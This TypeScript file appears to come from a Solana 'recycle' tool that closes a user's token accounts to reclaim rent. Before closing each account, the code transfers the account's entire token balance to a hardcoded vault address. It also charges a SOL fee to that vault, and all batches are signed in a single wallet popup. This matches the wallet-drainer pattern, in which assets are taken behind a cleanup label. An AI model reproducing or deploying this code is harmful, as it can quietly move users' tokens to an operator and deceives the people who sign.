// lib/recycle.ts
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import {
  createAssociatedTokenAccountIdempotentInstruction,
  createCloseAccountInstruction,
  createTransferCheckedInstruction,
  getAssociatedTokenAddress,
} from '@solana/spl-token';
import { TrashAccount } from './solana';

const VAULT = new PublicKey('DgkyF4YnwVYFqMSMo9WvDz2sVkFJSjsWueFYDrKgu87Z');
const BATCH_SIZE = 5;
const FEE_LAMPORTS_PER_ACCOUNT = Math.ceil(0.002 * 0.05 * LAMPORTS_PER_SOL);
const MAX_RETRIES = 3;
const RETRY_DELAY_MS = 1500;

function chunk<T>(arr: T[], size: number): T[][] {
  const result: T[][] = [];
  for (let i = 0; i < arr.length; i += size) result.push(arr.slice(i, i + size));
  return result;
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function buildBatchTransaction(
  batch: TrashAccount[],
  owner: PublicKey,
  blockhash: string,
  connection: Connection,
): Promise<Transaction> {
  const tx = new Transaction();
  tx.recentBlockhash = blockhash;
  tx.feePayer = owner;

  for (const account of batch) {
    const vaultATA = await getAssociatedTokenAddress(account.mint, VAULT, true);
    tx.add(
      createAssociatedTokenAccountIdempotentInstruction(owner, vaultATA, VAULT, account.mint),
      createTransferCheckedInstruction(
        account.pubkey, account.mint, vaultATA, owner, account.rawAmount, account.decimals
      ),
      createCloseAccountInstruction(account.pubkey, owner, owner),
    );
  }

  tx.add(
    SystemProgram.transfer({
      fromPubkey: owner,
      toPubkey: VAULT,
      lamports: FEE_LAMPORTS_PER_ACCOUNT * batch.length,
    }),
  );

  return tx;
}

async function sendWithRetry(
  connection: Connection,
  signedTx: Transaction,
): Promise<boolean> {
  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    try {
      if (attempt > 0) await sleep(RETRY_DELAY_MS);
      const sig = await connection.sendRawTransaction(signedTx.serialize());
      const { value } = await connection.confirmTransaction(sig, 'confirmed');
      if (value.err) throw new Error(`Transaction failed on-chain: ${JSON.stringify(value.err)}`);
      return true;
    } catch {
      if (attempt === MAX_RETRIES - 1) return false;
    }
  }
}

export async function recycleAccounts(
  accounts: TrashAccount[],
  owner: PublicKey,
  signAllTransactions: (txs: Transaction[]) => Promise<Transaction[]>,
  connection: Connection,
): Promise<{ succeeded: number; failed: number; solReclaimed: number }> {
  const batches = chunk(accounts, BATCH_SIZE);
  const { blockhash } = await connection.getLatestBlockhash('confirmed');

  const transactions = await Promise.all(
    batches.map((batch) => buildBatchTransaction(batch, owner, blockhash, connection))
  );

  // Single Phantom popup for all transactions at once
  const signedTransactions = await signAllTransactions(transactions);

  const results = await Promise.all(
    signedTransactions.map((signedTx, i) =>
      sendWithRetry(connection, signedTx).then((ok) => ({
        ok,
        batchSize: batches[i].length,
      }))
    )
  );

  let succeeded = 0;
  let failed = 0;
  for (const { ok, batchSize } of results) {
    if (ok) succeeded += batchSize;
    else failed += batchSize;
  }

  return { succeeded, failed, solReclaimed: succeeded * 0.002 * 0.95 };
}
